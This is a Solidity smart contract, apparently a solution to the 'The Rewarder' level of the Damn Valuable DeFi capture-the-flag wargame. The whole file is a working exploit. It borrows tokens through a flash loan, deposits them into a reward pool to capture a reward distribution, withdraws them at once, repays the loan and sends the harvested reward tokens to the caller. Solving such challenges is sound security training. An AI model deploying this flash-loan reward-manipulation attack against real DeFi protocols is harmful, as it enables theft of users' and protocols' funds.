// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract HackRewarder {
  DamnValuableToken public dvt;
  FlashLoanerPool public flashLoanerPool;
  TheRewarderPool public rewarderPool;
  RewardToken public rewardToken;

  constructor (
   address _dvtAddr,
   address _flashLoanerPoolAddr,
   address _rewarderPoolAddr,
   address _rewardTokenAddr
  ) {
   dvt = DamnValuableToken(_dvtAddr);
   flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddr);
   rewarderPool = TheRewarderPool(_rewarderPoolAddr);
   rewardToken = RewardToken(_rewardTokenAddr);
  }

  function flashLoan(uint _amount) external {
   dvt.approve(address(rewarderPool), _amount);
   flashLoanerPool.flashLoan(_amount);
  }

  function receiveFlashLoan(uint _amount) external {
   rewarderPool.deposit(_amount);
   rewarderPool.withdraw(_amount);
   dvt.transfer(address(flashLoanerPool), _amount);
  }

  function withdrawRewardTokens() external {
   require(rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this))));
  }
}